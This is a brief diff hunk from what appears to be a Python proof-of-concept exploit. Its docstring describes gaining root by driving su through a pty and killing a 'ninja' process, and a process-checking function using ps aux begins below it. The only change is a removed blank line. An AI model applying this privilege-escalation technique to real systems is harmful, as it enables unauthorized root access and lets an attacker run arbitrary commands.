@@ -45,7 +45,6 @@ It is therefore possible to use a pty to run a command such as su and provide th
 The following PoC becomes root using su and issues killall -9 ninja. The attacker can then run any commands that they wish.
  """
  
-
 executions = 0
 def check_procs():
 	p1 = subprocess.Popen(["ps", "aux"], stdout=subprocess.PIPE)
